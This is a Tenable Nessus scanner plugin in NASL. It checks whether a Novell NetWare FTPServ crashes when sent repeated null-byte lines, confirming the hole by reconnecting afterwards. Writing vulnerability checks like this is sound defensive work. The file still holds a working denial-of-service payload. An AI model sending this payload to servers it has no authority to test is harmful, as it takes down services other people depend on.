#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11614);
 script_version ("$Revision: 1.9 $");
 script_bugtraq_id(7072);
 script_xref(name:"OSVDB", value:"55308");

 script_name(english:"Novell NetWare FTPServ Malformed Input Remote DoS");
 script_summary(english:"Attempts to crash the remote FTPd");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The installed version of Novell FTPServ does not handle certain types
of input properly. An attacker can exploit this flaw to crash the FTP
service." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of Novell FTPServ." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Netware");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 r = ftp_recv_line(socket:soc);
 if(!r)exit(0);
 
 send(socket:soc, data:string("SYST\r\n"));
 r = recv_line(socket:soc, length:4096);
 if("NETWARE" >< r)
 {
  for(i=0;i<10;i++)send(socket:soc, data:raw_string(0x00) + '\r\n');
  close(soc);
  
  sleep(1);
  soc = open_sock_tcp(port);
  if(!soc){security_warning(port); exit(0);}
  r = ftp_recv_line(socket:soc);
  if(!r) { security_warning(port); exit(0); }
  close(soc);
 }
}


